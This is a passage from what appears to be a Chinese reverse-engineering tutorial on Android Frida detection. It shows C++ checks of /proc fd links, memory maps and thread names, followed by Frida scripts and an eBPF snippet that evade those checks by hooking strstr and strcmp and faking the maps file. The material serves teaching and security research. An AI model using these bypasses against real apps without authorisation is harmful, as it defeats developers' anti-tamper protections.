class="hljs-keyword">if</span> ((dir = <span class="hljs-built_in">opendir</span>(<span class="hljs-string">&quot;/proc/self/fd/&quot;</span>)) == <span class="hljs-literal">NULL</span>) &#123;  <br>        <span class="hljs-built_in">LOGI</span>(<span class="hljs-string">&quot; %s - %d  error:%s&quot;</span>, __FILE__, __LINE__, <span class="hljs-built_in">strerror</span>(errno));  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        entry = <span class="hljs-built_in">readdir</span>(dir);  <br>        <span class="hljs-keyword">while</span> (entry) &#123;  <br>            <span class="hljs-keyword">switch</span> (entry-&gt;d_type) &#123;  <br>                <span class="hljs-keyword">case</span> DT_LNK:  <br>                    <span class="hljs-built_in">sprintf</span>(link_name, <span class="hljs-string">&quot;%s/%s&quot;</span>, <span class="hljs-string">&quot;/proc/self/fd/&quot;</span>, entry-&gt;d_name);  <br>                    <span class="hljs-built_in">readlink</span>(link_name, buf, <span class="hljs-built_in">sizeof</span>(buf));  <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;frida&quot;</span>) || <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;gum-js-loop&quot;</span>) ||  <br>                        <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;gmain&quot;</span>) ||  <br>                        <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;-gadget&quot;</span>) || <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;linjector&quot;</span>)) &#123;    <span class="hljs-comment">//如果链接文件内容中包含特定的字符串，例如&quot;frida&quot;、&quot;gum-js-loop&quot;等，则进入条件判断块。</span><br>                        <span class="hljs-built_in">LOGI</span>(<span class="hljs-string">&quot;check_fd -&gt; find frida:%s&quot;</span>, buf);  <br>                        ret = <span class="hljs-literal">true</span>;  <br>                    &#125;  <br>                    <span class="hljs-keyword">break</span>;  <br>                <span class="hljs-keyword">default</span>:  <br>                    <span class="hljs-keyword">break</span>;  <br>            &#125;  <br>            entry = <span class="hljs-built_in">readdir</span>(dir);  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-built_in">closedir</span>(dir);  <br>    <span class="hljs-keyword">return</span> ret;  <br>&#125;  <br>  <br></code></pre></td></tr></table></figure><p><code>检测文件</code></p><p>众所周知frida我们一般都会放在data&#x2F;local&#x2F;tmp目录下，旧版fridaserver端运行时都会释放到re.frida.server，所以这里在旧版也会被当做一个检测点，而新版已不再释放</p><p><code>检测map</code></p><p><img src="informatin/book/笔记/照片/image-20240721002300291.png" alt="image-20240721002300291"></p><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td>u0_a504</td><td>用户ID和应用ID：在Android系统中，<code>u0</code>代表系统用户（user 0），而<code>a504</code>是该应用在用户0下的唯一标识符。</td></tr><tr><td>28082</td><td>PID（进程ID）：该进程在操作系统中的标识符。</td></tr><tr><td>1935</td><td>PPID（父进程ID）：该进程的父进程的PID。</td></tr><tr><td>6511212</td><td>虚拟内存：进程使用的虚拟内存大小，通常以字节为单位。</td></tr><tr><td>125728</td><td>共享内存：进程使用的共享内存大小，同样以字节为单位。</td></tr><tr><td>0</td><td>CPU时间&#x2F;线程数：这通常表示进程的CPU时间或者是线程数，具体含义取决于<code>ps</code>命令的输出格式。</td></tr><tr><td>S</td><td>状态：其中<code>S</code>代表睡眠状态（Sleeping），即进程没有在执行，而是在等待某些事件或资源。</td></tr></tbody></table><p><code>/proc/self/maps</code> 是一个特殊的文件，它包含了当前进程的内存映射信息。当你打开这个文件时，它会显示一个列表，其中包含了进程中每个内存区域的详细信息。这些信息通常包括：</p><ul><li>起始地址（Start Address）</li><li>结束地址（End Address）</li><li>权限（如可读、可写、可执行）</li><li>共享&#x2F;私有标志（Shared or Private）</li><li>关联的文件或设备（如果内存区域是文件映射的）</li><li>内存区域的偏移量</li><li>内存区域的类型（如匿名映射、文件映射、设备映射等）<br>当注入frida后，在maps文件中就会存在 <code>frida-agent-64.so</code>、<code>frida-agent-32.so</code> 等文件。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check_maps</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-comment">// 定义一个足够大的字符数组line，用于存储读取的行  </span><br>    <span class="hljs-type">char</span> line[<span class="hljs-number">512</span>];  <br>    <span class="hljs-comment">// 打开当前进程的内存映射文件/proc/self/maps进行读取  </span><br>    FILE* fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);  <br>    <span class="hljs-keyword">if</span> (fp) &#123;  <br>        <span class="hljs-comment">// 如果文件成功打开，循环读取每一行  </span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgets</span>(line, <span class="hljs-built_in">sizeof</span>(line), fp)) &#123;  <br>            <span class="hljs-comment">// 使用strstr函数检查当前行是否包含&quot;frida&quot;字符串  </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;frida&quot;</span>) || <span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;gadget&quot;</span>)) &#123;  <br>                <span class="hljs-comment">// 如果找到了&quot;frida&quot;，关闭文件并返回true，表示检测到了恶意库  </span><br>                <span class="hljs-built_in">fclose</span>(fp);  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// Evil library is loaded.  </span><br>            &#125;  <br>        &#125;  <br>        <span class="hljs-comment">// 遍历完文件后，关闭文件  </span><br>        <span class="hljs-built_in">fclose</span>(fp);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-comment">// 如果无法打开文件，记录错误。这可能意味着系统状态异常  </span><br>        <span class="hljs-comment">// 注意：这里的代码没有处理错误，只是注释说明了可能的情况  </span><br>    &#125;  <br>    <span class="hljs-comment">// 如果没有在内存映射文件中找到&quot;frida&quot;，返回false，表示没有检测到恶意库  </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// No evil library detected.  </span><br>&#125;  <br></code></pre></td></tr></table></figure><p>绕过的方式</p><p><code>anti脚本</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 定义一个函数anti_maps，用于阻止特定字符串的搜索匹配，避免检测到敏感内容如&quot;Frida&quot;或&quot;REJECT&quot;  </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">anti_maps</span>(<span class="hljs-params"></span>) &#123;  <br>    <span class="hljs-comment">// 查找libc.so库中strstr函数的地址，strstr用于查找字符串中首次出现指定字符序列的位置  </span><br>    <span class="hljs-keyword">var</span> pt_strstr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&#x27;strstr&#x27;</span>);  <br>    <span class="hljs-comment">// 查找libc.so库中strcmp函数的地址，strcmp用于比较两个字符串  </span><br>    <span class="hljs-keyword">var</span> pt_strcmp = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&#x27;strcmp&#x27;</span>);  <br>    <span class="hljs-comment">// 使用Interceptor模块附加到strstr函数上，拦截并修改其行为  </span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(pt_strstr, &#123;  <br>        <span class="hljs-comment">// 在strstr函数调用前执行的回调  </span><br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;  <br>            <span class="hljs-comment">// 读取strstr的第一个参数（源字符串）和第二个参数（要查找的子字符串）  </span><br>            <span class="hljs-keyword">var</span> str1 = args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readCString</span>();  <br>            <span class="hljs-keyword">var</span> str2 = args[<span class="hljs-number">1</span>].<span class="hljs-title function_">readCString</span>();  <br>            <span class="hljs-comment">// 检查子字符串是否包含&quot;REJECT&quot;或&quot;frida&quot;，如果包含则设置hook标志为true  </span><br>            <span class="hljs-keyword">if</span> (str2.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;REJECT&quot;</span>) !== -<span class="hljs-number">1</span>  || str2.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;frida&quot;</span>) !== -<span class="hljs-number">1</span>) &#123;  <br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hook</span> = <span class="hljs-literal">true</span>;  <br>            &#125;  <br>        &#125;,  <br>        <span class="hljs-comment">// 在strstr函数调用后执行的回调  </span><br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;  <br>            <span class="hljs-comment">// 如果之前设置了hook标志，则将strstr的结果替换为0（表示未找到），从而隐藏敏感信息  </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hook</span>) &#123;  <br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">0</span>);  <br>            &#125;  <br>        &#125;  <br>    &#125;);  <br>  <br>    <span class="hljs-comment">// 对strcmp函数做类似的处理，防止通过字符串比较检测敏感信息  </span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(pt_strcmp, &#123;  <br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;  <br>            <span class="hljs-keyword">var</span> str1 = args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readCString</span>();  <br>            <span class="hljs-keyword">var</span> str2 = args[<span class="hljs-number">1</span>].<span class="hljs-title function_">readCString</span>();  <br>            <span class="hljs-keyword">if</span> (str2.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;REJECT&quot;</span>) !== -<span class="hljs-number">1</span>  || str2.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;frida&quot;</span>) !== -<span class="hljs-number">1</span>) &#123;  <br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hook</span> = <span class="hljs-literal">true</span>;  <br>            &#125;  <br>        &#125;,  <br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;  <br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hook</span>) &#123;  <br>                <span class="hljs-comment">// strcmp返回值为0表示两个字符串相等，这里同样替换为0以避免匹配成功  </span><br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">0</span>);  <br>            &#125;  <br>        &#125;  <br>    &#125;);  <br>&#125;  <br>  <br></code></pre></td></tr></table></figure><p><code>重定向maps</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 定义一个函数，用于重定向并修改maps文件内容，以隐藏特定的库和路径信息  </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mapsRedirect</span>(<span class="hljs-params"></span>) &#123;  <br>    <span class="hljs-comment">// 定义伪造的maps文件路径  </span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">FakeMaps</span> = <span class="hljs-string">&quot;/data/data/com.zj.wuaipojie/maps&quot;</span>;  <br>    <span class="hljs-comment">// 获取libc.so库中&#x27;open&#x27;函数的地址  </span><br>    <span class="hljs-keyword">const</span> openPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&#x27;libc.so&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>);  <br>    <span class="hljs-comment">// 根据地址创建一个新的NativeFunction对象，表示原生的&#x27;open&#x27;函数  </span><br>    <span class="hljs-keyword">const</span> open = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(openPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);  <br>    <span class="hljs-comment">// 查找并获取libc.so库中&#x27;read&#x27;函数的地址  </span><br>    <span class="hljs-keyword">var</span> readPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>);  <br>    <span class="hljs-comment">// 创建新的NativeFunction对象表示原生的&#x27;read&#x27;函数  </span><br>    <span class="hljs-keyword">var</span> read = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(readPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&quot;int&quot;</span>]);  <br>    <span class="hljs-comment">// 分配512字节的内存空间，用于临时存储从maps文件读取的内容  </span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsBuffer</span> = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">512</span>);  <br>    <span class="hljs-comment">// 创建一个伪造的maps文件，用于写入修改后的内容，模式为&quot;w&quot;（写入）  </span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-title class_">FakeMaps</span>, <span class="hljs-string">&quot;w&quot;</span>);  <br>    <span class="hljs-comment">// 使用Interceptor替换原有的&#x27;open&#x27;函数，注入自定义逻辑  </span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>(openPtr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">pathname, flag</span>) &#123;  <br>        <span class="hljs-comment">// 调用原始的&#x27;open&#x27;函数，并获取文件描述符（FD）  </span><br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">FD</span> = <span class="hljs-title function_">open</span>(pathname, flag);  <br>        <span class="hljs-comment">// 读取并打印尝试打开的文件路径  </span><br>        <span class="hljs-keyword">var</span> ch = pathname.<span class="hljs-title function_">readCString</span>();  <br>        <span class="hljs-keyword">if</span> (ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;/proc/&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;maps&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;open : &quot;</span>, pathname.<span class="hljs-title function_">readCString</span>());  <br>            <span class="hljs-comment">// 循环读取maps内容，并写入伪造的maps文件中，同时进行字符串替换以隐藏特定信息  </span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">read</span>(<span class="hljs-variable constant_">FD</span>, <span class="hljs-title class_">MapsBuffer</span>, <span class="hljs-number">512</span>)) !== <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-keyword">var</span> <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MapsBuffer</span>.<span class="hljs-title function_">readCString</span>();  <br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp/re.frida.server/frida-agent-64.so&quot;</span>, <span class="hljs-string">&quot;FakingMaps&quot;</span>);  <br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;re.frida.server&quot;</span>, <span class="hljs-string">&quot;FakingMaps&quot;</span>);  <br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;frida-agent-64.so&quot;</span>, <span class="hljs-string">&quot;FakingMaps&quot;</span>);  <br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;frida-agent-32.so&quot;</span>, <span class="hljs-string">&quot;FakingMaps&quot;</span>);  <br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;frida&quot;</span>, <span class="hljs-string">&quot;FakingMaps&quot;</span>);  <br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp&quot;</span>, <span class="hljs-string">&quot;/data&quot;</span>);  <br>                <span class="hljs-comment">// 将修改后的内容写入伪造的maps文件  </span><br>                <span class="hljs-title class_">MapsFile</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">MBuffer</span>);  <br>            &#125;  <br>            <span class="hljs-comment">// 为返回伪造maps文件的打开操作，分配UTF8编码的文件名字符串  </span><br>            <span class="hljs-keyword">var</span> filename = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-title class_">FakeMaps</span>);  <br>            <span class="hljs-comment">// 返回打开伪造maps文件的文件描述符  </span><br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">open</span>(filename, flag);  <br>        &#125;  <br>        <span class="hljs-comment">// 如果不是目标maps文件，则直接返回原open调用的结果  </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">FD</span>;  <br>    &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));  <br>&#125;  <br></code></pre></td></tr></table></figure><p>用eBPF来hook系统调用并修改参数实现目的，使用bpf_probe_write_user向用户态函数地址写内容直接修改参数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-built_in">char</span> placeholder[] = <span class="hljs-string">&quot;/data/data/com.zj.wuaipojie/maps&quot;</span>;  <br>bpf_probe_write_user((<span class="hljs-keyword">void</span>*)addr, placeholder, <span class="hljs-keyword">sizeof</span>(placeholder));  <br></code></pre></td></tr></table></figure><p><code>检测status(线程名)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /proc/pid/task 列出线程<span class="hljs-built_in">id</span>  <br><span class="hljs-built_in">cat</span> /proc/pid/task/线程<span class="hljs-built_in">id</span>/status  <br></code></pre></td></tr></table></figure><ul><li>在 <code>/proc/pid/task</code> 目录下，可以通过查看不同的线程子目录，来获取进程中每个线程的运行时信息。这些信息包括线程的状态、线程的寄存器内容、线程占用的CPU时间、线程的堆栈信息等。通过这些信息，可以实时观察和监控进程中每个线程的运行状态，帮助进行调试、性能优化和问题排查等工作。</li><li>在某些app中就会去读取 <code>/proc/stask/线程ID/status</code> 文件，如果是运行frida产生的，则进行反调试。例如：<code>gmain/gdbus/gum-js-loop/pool-frida</code>等</li></ul><ol><li>gmain：Frida 使用 Glib 库，其中的主事件循环被称为 GMainLoop。在 Frida 中，gmain 表示 GMainLoop 的线程。</li><li>gdbus：GDBus 是 Glib 提供的一个用于 D-Bus 通信的库。在 Frida 中，gdbus 表示 GDBus 相关的线程。</li><li>gum-js-loop：Gum 是 Frida 的运行时引擎，用于执行注入的 JavaScript 代码。gum-js-loop 表示 Gum 引擎执行 JavaScript 代码的线程。</li><li>pool-frida：Frida 中的某些功能可能会使用线程池来处理任务，pool-frida 表示 Frida 中的线程池。</li><li>linjector 是一种用于 Android 设备的开源工具，它允许用户在运行时向 Android 应用程序注入动态链接库（DLL）文件。通过注入 DLL 文件，用户可以修改应用程序的行为、调试应用程序、监视函数调用等，这在逆向工程、安全研究和动态分析中是非常有用的。<br>PS:由于frida可以随时附加到进程，所以写的检测必须覆盖APP的全周期，或者至少是敏感函数执行前</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check_status</span><span class="hljs-params">()</span> </span>&#123;  <br>    DIR *dir = <span class="hljs-built_in">opendir</span>(<span class="hljs-string">&quot;/proc/self/task/&quot;</span>);  <br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dirent</span> *entry;  <br>    <span class="hljs-type">char</span> status_path[MAX_PATH];  <br>    <span class="hljs-type">char</span> buffer[MAX_BUFFER];  <br>    <span class="hljs-type">int</span> found = <span class="hljs-literal">false</span>;  <br>  <br>    <span class="hljs-keyword">if</span> (dir) &#123;  <br>        <span class="hljs-keyword">while</span> ((entry = <span class="hljs-built_in">readdir</span>(dir)) != <span class="hljs-literal">NULL</span>) &#123;  <br>            <span class="hljs-keyword">if</span> (entry-&gt;d_type == DT_DIR) &#123;  <br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(entry-&gt;d_name, <span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(entry-&gt;d_name, <span class="hljs-string">&quot;..&quot;</span>) == <span class="hljs-number">0</span>) &#123;  <br>                    <span class="hljs-keyword">continue</span>;  <br>                &#125;  <br>                <span class="hljs-built_in">snprintf</span>(status_path, <span class="hljs-built_in">sizeof</span>(status_path), <span class="hljs-string">&quot;/proc/self/task/%s/status&quot;</span>, entry-&gt;d_name);  <br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">read_file</span>(status_path, buffer, <span class="hljs-built_in">sizeof</span>(buffer)) == <span class="hljs-number">-1</span>) &#123;  <br>                    <span class="hljs-keyword">continue</span>;  <br>                &#125;  <br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;null&quot;</span>) == <span class="hljs-number">0</span>) &#123;  <br>                    <span class="hljs-keyword">continue</span>;  <br>                &#125;  <br>                <span class="hljs-type">char</span> *line = <span class="hljs-built_in">strtok</span>(buffer, <span class="hljs-string">&quot;\n&quot;</span>);  <br>                <span class="hljs-keyword">while</span> (line) &#123;  <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;Name:&quot;</span>) != <span class="hljs-literal">NULL</span>) &#123;  <br>                        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *frida_name = <span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;gmain&quot;</span>);  <br>                        <span class="hljs-keyword">if</span> (frida_name || <span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;gum-js-loop&quot;</span>) || <span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;pool-frida&quot;</span>) || <span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;gdbus&quot;</span>)) &#123;  <br>                            found = <span class="hljs-literal">true</span>;  <br>                            <span class="hljs-keyword">break</span>;  <br>                        &#125;  <br>                    &#125;  <br>                    line = <span class="hljs-built_in">strtok</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;\n&quot;</span>);  <br>                &#125;  <br>                <span class="hljs-keyword">if</span> (found) <span class="hljs-keyword">break</span>;  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-built_in">closedir</span>(dir);  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> found;  <br>&#125;  <br></code></pre></td></tr></table></figure><p><code>检测inlinehook</code></p><p>通过Frida查看一个函数hook之前和之后的机器码，以此来判断是否被Frida的inlinehook注入。</p><p><img src="image-20240721023344735.png" alt="image-20240721023344735"></p><p>下面的方案以内存中字节和本地对应的字节进行比较，如果不一致，那么可以认为内存中的字节被修改了，即被inlinehook了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dlfcn/local_dlfcn.h&quot;</span>  </span><br>  <br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check_inlinehook</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-comment">// 根据系统架构选择对应的libc.so库路径  </span><br>    <span 